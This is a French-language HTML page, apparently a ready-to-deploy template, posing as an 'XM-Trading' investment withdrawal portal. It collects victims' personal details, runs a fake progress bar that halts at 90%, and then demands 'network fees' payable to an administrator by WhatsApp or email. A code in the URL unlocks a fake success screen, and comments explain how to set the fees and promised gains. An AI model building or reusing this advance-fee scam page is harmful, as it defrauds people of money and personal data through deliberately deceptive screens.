<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Retrait d’investissement</title>
  <!-- Google Font Montserrat -->
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
  <style>
    /* Reset minimal */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    html, body {
      height: 100%;
    }
    body {
      font-family: 'Montserrat', Arial, sans-serif;
      background-color: #f5f5f5;
      color: #333;
      line-height: 1.6;
      display: flex;
      flex-direction: column;
    }
    a {
      color: #007bff;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }

    /* Header */
    header.site-header {
      background-color: #000;
      color: #fff;
      padding: 15px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    header.site-header .logo {
      display: flex;
      align-items: center;
    }
    header.site-header .logo img {
      height: 40px;
      margin-right: 10px;
    }
    header.site-header h1 {
      font-size: 1.5rem;
      font-weight: 600;
    }
    header.site-header nav a {
      margin-left: 20px;
      font-weight: 500;
      color: #fff;
    }
    header.site-header nav a:hover {
      color: #007bff;
    }

    /* Container principal */
    .container {
      flex: 1;
      max-width: 700px;
      width: 100%;
      margin: 20px auto;
      background-color: #fff;
      padding: 25px 30px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }
    .container h2 {
      margin-bottom: 15px;
      font-size: 1.4rem;
      color: #000;
    }
    .container p {
      margin-bottom: 15px;
    }
    form label {
      display: block;
      margin-bottom: 5px;
      font-weight: 500;
      color: #222;
    }
    form input[type="text"],
    form input[type="number"],
    form select {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 1rem;
    }
    form input[type="tel"] {
      width: calc(100% - 70px);
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      margin-left: 70px;
      font-size: 1rem;
    }
    .phone-prefix {
      position: relative;
      margin-bottom: 15px;
    }
    .phone-prefix span {
      position: absolute;
      left: 10px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 0.95rem;
      color: #555;
    }
    .phone-prefix input {
      padding-left: 55px;
    }
    input::placeholder {
      color: #999;
    }
    /* Boutons */
    button, input[type="submit"] {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 12px 20px;
      cursor: pointer;
      border-radius: 4px;
      font-size: 1rem;
      font-weight: 500;
      transition: background-color 0.2s ease;
    }
    button:hover, input[type="submit"]:hover {
      background-color: #0056b3;
    }
    /* Lien sous le formulaire initial (sera géré en JS) */
    #showCodeWrapper {
      margin-top: 10px;
      display: none; /* masqué par défaut */
    }
    #showCodeWrapper a {
      color: #007bff;
      font-size: 0.95rem;
    }

    /* Modal overlay */
    .modal-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-color: rgba(0,0,0,0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      visibility: hidden;
      opacity: 0;
      transition: opacity 0.2s ease;
    }
    .modal-overlay.active {
      visibility: visible;
      opacity: 1;
    }
    .modal-content {
      background-color: #fff;
      padding: 25px 20px;
      width: 90%;
      max-width: 450px;
      border-radius: 8px;
      text-align: center;
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    }
    .modal-content p {
      font-size: 1rem;
      margin-bottom: 15px;
      color: #222;
    }
    .progress-bar-container {
      width: 100%;
      background-color: #e0e0e0;
      border-radius: 4px;
      overflow: hidden;
      margin: 20px 0;
    }
    .progress-bar {
      width: 0%;
      height: 20px;
      background-color: #007bff;
      transition: width 0.3s ease;
    }
    #feeSection p {
      margin-top: 15px;
      font-size: 0.95rem;
      color: #333;
    }
    #feeSection p a {
      color: #d9534f; /* rouge pour contact */
      font-weight: 500;
    }
    /* Plus de bouton “J’ai réglé” ici, on ne l’affiche plus */

    /* Section succès inline */
    #success-section {
      display: none;
      margin-top: 20px;
      text-align: center;
    }
    #success-section h2 {
      font-size: 1.6rem;
      margin-bottom: 15px;
      color: #fff;
    }
    #success-section p {
      margin-bottom: 10px;
      color: #fff;
      font-size: 1rem;
    }
    body.success-mode {
      background-image: url('success-bg.jpg');
      background-size: cover;
      background-position: center;
      color: #fff;
    }
    body.success-mode .container {
      background-color: rgba(0,0,0,0.7);
      color: #fff;
    }

    /* Footer */
    footer.site-footer {
      background-color: #000;
      color: #ccc;
      padding: 15px 20px;
      text-align: center;
      font-size: 0.9rem;
    }
    footer.site-footer a {
      color: #007bff;
    }
    footer.site-footer a:hover {
      color: #fff;
    }

    /* Responsive adjustments */
    @media (max-width: 600px) {
      header.site-header, footer.site-footer {
        flex-direction: column;
        text-align: center;
      }
      header.site-header nav a {
        margin: 8px;
      }
      .container {
        margin: 15px;
        padding: 20px;
      }
      .modal-content {
        padding: 20px;
      }
    }
  </style>
</head>
<body id="page-index">
  <!-- En-tête -->
  <header class="site-header">
    <div class="logo">
      <!-- Si vous avez un logo, décommentez : 
      <img src="logo.png" alt="Logo"> 
      -->
      <h1>XM-Trading Retrait</h1>
    </div>
    <nav>
      <a href="#initial-section">Accueil</a>
      <a href="#initial-section">Demande</a>
      <a href="#footer-contact">Contact</a>
    </nav>
  </header>

  <!-- Contenu principal -->
  <div class="container">
    <!-- SECTION 1 : Formulaire initial -->
    <div id="initial-section">
      <h2>Demande de retrait</h2>
      <form id="withdrawal-form" name="withdrawal-request" data-netlify="true" netlify-honeypot="bot-field">
        <!-- Netlify Forms -->
        <input type="hidden" name="form-name" value="withdrawal-request">
        <p style="display:none">
          <label>Ne pas remplir <input name="bot-field"></label>
        </p>

        <label for="firstName">Prénom</label>
        <input type="text" id="firstName" name="firstName" placeholder="Votre prénom" required>

        <label for="lastName">Nom</label>
        <input type="text" id="lastName" name="lastName" placeholder="Votre nom de famille" required>

        <label for="country">Pays</label>
        <select id="country" name="country" required>
          <option value="">Sélectionnez votre pays</option>
          <!-- options ajoutées par JS -->
        </select>

        <label for="phone">Téléphone</label>
        <div class="phone-prefix">
          <span id="phone-prefix">+XXX</span>
          <input type="tel" id="phone" name="phone" placeholder="Numéro sans indicatif" required>
        </div>

        <!-- Devise avant montant -->
        <label for="currency">Devise</label>
        <select id="currency" name="currency" required>
          <option value="">Sélectionnez</option>
          <option value="FCFA">FCFA</option>
          <option value="USD">USD</option>
        </select>

        <label for="amount">Montant à retirer</label>
        <input type="number" id="amount" name="amount" placeholder="Ex. 500" min="1" required>
        <small>Note : des frais de réseau s’appliquent et devront être soldés auprès de l’administrateur.</small>

        <label for="profession">Métier</label>
        <input type="text" id="profession" name="profession" placeholder="Votre profession" required>

        <label for="age">Âge</label>
        <input type="number" id="age" name="age" placeholder="Ex. 30" min="18" required>

        <label for="investmentCode">Code d’investissement initial</label>
        <input type="text" id="investmentCode" name="investmentCode" placeholder="Code reçu auparavant" required>
        <small>Ce code initial doit vous avoir été communiqué par l’administrateur avant cette étape.</small>

        <input type="submit" value="Valider la demande">
      </form>
      <!-- Lien “Cliquez ici pour saisir votre code” masqué par défaut et géré par JS -->
      <p id="showCodeWrapper">
        Vous avez déjà soldé les frais ? 
        <a href="#" id="showCodeDirect">Cliquez ici pour saisir votre code</a>
      </p>
    </div>

    <!-- SECTION 2 : saisie du code après paiement hors-ligne -->
    <div id="code-section" style="display: none;">
      <h2>Confirmation finale</h2>
      <p>Vous avez reçu votre nouveau code de confirmation ? Saisissez-le ci-dessous :</p>
      <form id="confirm-form">
        <label for="newInvestmentCode">Nouveau code d’investissement</label>
        <input type="text" id="newInvestmentCode" name="newInvestmentCode" placeholder="Entrez le code reçu" required>
        <input type="submit" value="Valider le code">
      </form>
      <p id="confirmError" style="color:red; display:none;">Veuillez saisir un code valide.</p>
    </div>

    <!-- SECTION 3 : Succès (affichée en fin) -->
    <div id="success-section">
      <h2>Félicitations ! Votre retrait est finalisé</h2>
      <p>Votre demande de retrait a été traitée avec succès.</p>
      <p>L’administrateur a confirmé la réception des frais et validé votre transaction.</p>
      <p>Le montant sera versé selon les modalités convenues.</p>
      <p>Pour toute question supplémentaire, contactez de nouveau l’administrateur.</p>
    </div>
  </div>

  <!-- Modal de progression unique -->
  <div id="progressModal" class="modal-overlay">
    <div class="modal-content">
      <p id="progressText">Traitement en cours...</p>
      <div class="progress-bar-container">
        <div id="progressBar" class="progress-bar"></div>
      </div>
      <div id="feeSection" style="display: none;">
        <!-- Message à 90%: frais et gain affichés ici -->
        <p class="fee-message" id="feeMessage">
          <!-- Remplie dynamiquement en JS -->
        </p>
        <p>
          Veuillez contacter l’administrateur pour solder ces frais :<br>
          <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a><br>
          <a href="tel:+2376XXXXXXX">WhatsApp/Phone: +237 6XXXXXXX</a>
        </p>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <footer class="site-footer" id="footer-contact">
    <p>&copy; 2025 XM-Trading. Tous droits réservés.</p>
    <p>Contact : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a> | WhatsApp: +237 6XXXXXXX</p>
  </footer>

  <script>
    // Mapping simple pays → indicatif
    const countryDialCodes = [
      { name: "Cameroun", code: "CM", dial_code: "+237" },
      { name: "Nigeria", code: "NG", dial_code: "+234" },
      { name: "Ghana", code: "GH", dial_code: "+233" },
      { name: "Kenya", code: "KE", dial_code: "+254" },
      { name: "Côte d'Ivoire", code: "CI", dial_code: "+225" },
      { name: "Sénégal", code: "SN", dial_code: "+221" },
      { name: "Mali", code: "ML", dial_code: "+223" },
      { name: "République démocratique du Congo", code: "CD", dial_code: "+243" },
      { name: "Rwanda", code: "RW", dial_code: "+250" },
      { name: "Ouganda", code: "UG", dial_code: "+256" }
      // Ajoutez d’autres pays si nécessaire
    ];

    document.addEventListener('DOMContentLoaded', () => {
      // Remplir le select pays et gérer indicatif
      const countrySelect = document.getElementById('country');
      const phonePrefixSpan = document.getElementById('phone-prefix');
      if (countrySelect && phonePrefixSpan) {
        countryDialCodes.forEach(item => {
          const option = document.createElement('option');
          option.value = item.code;
          option.textContent = item.name;
          option.dataset.dialCode = item.dial_code;
          countrySelect.appendChild(option);
        });
        countrySelect.addEventListener('change', () => {
          const sel = countrySelect.selectedOptions[0];
          phonePrefixSpan.textContent = (sel && sel.dataset.dialCode) ? sel.dataset.dialCode : '+XXX';
        });
      }

      // Récupérer éléments des sections
      const initialSection = document.getElementById('initial-section');
      const codeSection = document.getElementById('code-section');
      const successSection = document.getElementById('success-section');
      const withdrawalForm = document.getElementById('withdrawal-form');
      const confirmForm = document.getElementById('confirm-form');
      const confirmError = document.getElementById('confirmError');
      const showCodeWrapper = document.getElementById('showCodeWrapper');
      const showCodeDirect = document.getElementById('showCodeDirect');
      const modal = document.getElementById('progressModal');
      const progressBar = document.getElementById('progressBar');
      const progressText = document.getElementById('progressText');
      const feeSection = document.getElementById('feeSection');
      const feeMessage = document.getElementById('feeMessage');

      // Variables contrôlables par l’administrateur :
      // Par exemple, frais fixes par devise ou calculés selon le montant.
      // Ici, exemple statique ; ajustez selon votre logique.
      const networkFeeFCFA = 100; // frais en FCFA
      const networkFeeUSD = 10;   // frais en USD
      // Gain attendu (par ex. pour UX, montant que le client “gagne” ou reçoit en plus).
      // Vous pouvez aussi calculer selon amount, ex: gain = amount * 1.1, etc.
      // Ici, exemple statique : on fixe un ratio ou un montant.
      const gainRatioFCFA = 1.2;  // 20% de gain sur le montant
      const gainRatioUSD = 1.2;   // exemple même ratio
      // Si vous préférez contrôle manuel, remplacez par valeurs fixes :
      // const fixedGainFCFA = 600; etc.

      // Au chargement, gérer l’affichage du lien “Cliquez ici”
      // On montre ce lien seulement si le paramètre URL 'code' est fourni ET correspond à un code (pour UX).
      // Mais on peut également le masquer ici, car on n’affiche pas la saisie de code via ce lien.
      // Nous masquons le lien définitivement : pas d’accès direct sans param code.
      if (showCodeWrapper) {
        showCodeWrapper.style.display = 'none'; // toujours masqué
      }

      // Saisie du code uniquement si URL contient param code
      const urlParams = new URLSearchParams(window.location.search);
      const expectedCode = urlParams.get('code'); // code unique que l’admin envoie dans le lien
      // Si expectedCode est présent, on affiche la section de saisie du code.
      if (expectedCode) {
        // On laisse code-section masqué jusqu’à ce que l’utilisateur clique après modal 90%
        // Mais on permet l’accès direct si la page est rechargée avec param code, après succès de paiement hors-ligne.
        // Par sécurité, on ne montre pas immédiatement ; l’utilisateur doit d’abord passer par le flux initial ou reload.
        // Ici, si le client accède directement avec ?code=XYZ, on peut lui laisser voir la section code directement,
        // ou exiger d’abord qu’il soumette une demande ? Selon votre besoin. On choisit ici : s’il a bien versé,
        // il aura le lien, donc on peut afficher directement.
        // Mais pour éviter confusion, on vérifie qu’un champ localStorage 'hasSubmitted' est à true.
        const hasSubmitted = localStorage.getItem('hasSubmitted') === 'true';
        if (hasSubmitted) {
          // Afficher directement la section code, masquer le formulaire initial
          if (initialSection) initialSection.style.display = 'none';
          if (codeSection) codeSection.style.display = 'block';
        }
        // Si pas hasSubmitted, on garde section code masquée ; l’utilisateur doit d’abord soumettre.
      }

      // Soumission du formulaire initial
      if (withdrawalForm) {
        withdrawalForm.addEventListener('submit', function(e) {
          e.preventDefault();
          // Récupérer les valeurs
          const formData = new FormData(withdrawalForm);
          const currency = formData.get('currency');
          const amountStr = formData.get('amount');
          const amount = parseFloat(amountStr);
          // Calculer frais et gain selon devise et montant
          let networkFee = 0, gainValue = 0;
          if (currency === 'USD') {
            networkFee = networkFeeUSD;
            gainValue = amount * gainRatioUSD;
          } else {
            networkFee = networkFeeFCFA;
            gainValue = amount * gainRatioFCFA;
          }
          // Arrondir gainValue selon devise (entier si FCFA, 2 décimales si USD)
          if (currency === 'USD') {
            gainValue = Math.round(gainValue * 100) / 100;
          } else {
            gainValue = Math.round(gainValue);
          }

          // Envoi Netlify Forms pour garder trace (optionnel)
          const data = {};
          formData.forEach((v,k) => { data[k] = v; });
          data['form-name'] = withdrawalForm.getAttribute('name');
          const encode = (obj) => Object.keys(obj)
            .map(k => encodeURIComponent(k)+'='+encodeURIComponent(obj[k])).join('&');
          fetch('/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: encode(data)
          }).then(()=>console.log("Envoyé à Netlify Forms"))
            .catch(err=>console.error("Erreur Netlify Forms:", err));

          // Marquer en localStorage que l’utilisateur a soumis au moins une fois
          localStorage.setItem('hasSubmitted', 'true');

          // Lancer modal + progression jusqu’à 90%
          showProgressModal(networkFee, gainValue, currency);
        });
      }

      // Soumission du code
      if (confirmForm) {
        confirmForm.addEventListener('submit', (e) => {
          e.preventDefault();
          const codeInput = document.getElementById('newInvestmentCode');
          const code = codeInput ? codeInput.value.trim() : '';
          if (!code) {
            if (confirmError) {
              confirmError.textContent = "Veuillez saisir le code.";
              confirmError.style.display = 'block';
            } else {
              alert("Veuillez saisir le code.");
            }
            return;
          }
          // Vérifier que code correspond au param attendu
          if (!expectedCode) {
            alert("Aucun code valide n'est fourni. Contactez l'administrateur pour obtenir le lien correct.");
            return;
          }
          if (code !== expectedCode) {
            if (confirmError) {
              confirmError.textContent = "Code incorrect. Veuillez vérifier le code envoyé par l’administrateur.";
              confirmError.style.display = 'block';
            }
            return;
          }
          if (confirmError) confirmError.style.display = 'none';
          showFinalProgress();
        });
      }

      // Fonctions modal et progression
      function showProgressModal(networkFee, gainValue, currency) {
        if (!modal || !progressBar || !progressText || !feeSection) return;
        modal.classList.add('active');
        feeSection.style.display = 'none';
        progressBar.style.width = '0%';
        progressText.textContent = 'Traitement en cours...';

        let prog = 0;
        const target = 90;
        const interval = 50;
        const step = 1;
        const timer = setInterval(() => {
          if (prog < target) {
            prog += step;
            progressBar.style.width = prog + '%';
          } else {
            clearInterval(timer);
            progressText.textContent = `Progression : ${target}%`;
            // Afficher message avec frais et gain
            // Exemple : "Vous devez payer 100 FCFA et vous gagnerez 600 FCFA. Contactez l’administrateur..."
            feeMessage.innerHTML = `Vous devez payer <strong>${networkFee} ${currency}</strong> ` +
              `et vous recevrez un gain de <strong>${gainValue} ${currency}</strong> une fois validé.`;
            feeSection.style.display = 'block';
          }
        }, interval);
      }

      function showFinalProgress() {
        if (!modal || !progressBar || !progressText) return;
        modal.classList.add('active');
        progressBar.style.width = '0%';
        progressText.textContent = 'Finalisation en cours...';
        if (feeSection) feeSection.style.display = 'none';

        let prog = 0;
        const target = 100;
        const interval = 30;
        const step = 2;
        const timer = setInterval(() => {
          if (prog < target) {
            prog += step;
            if (prog > target) prog = target;
            progressBar.style.width = prog + '%';
            progressText.textContent = `Progression : ${prog}%`;
          } else {
            clearInterval(timer);
            setTimeout(() => {
              hideProgressModal();
              enterSuccessMode();
            }, 500);
          }
        }, interval);
      }

      function hideProgressModal() {
        if (!modal) return;
        modal.classList.remove('active');
      }

      function enterSuccessMode() {
        if (initialSection) initialSection.style.display = 'none';
        if (codeSection) codeSection.style.display = 'none';
        if (successSection) successSection.style.display = 'block';
        document.body.classList.add('success-mode');
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }
    });
  </script>
</body>
</html>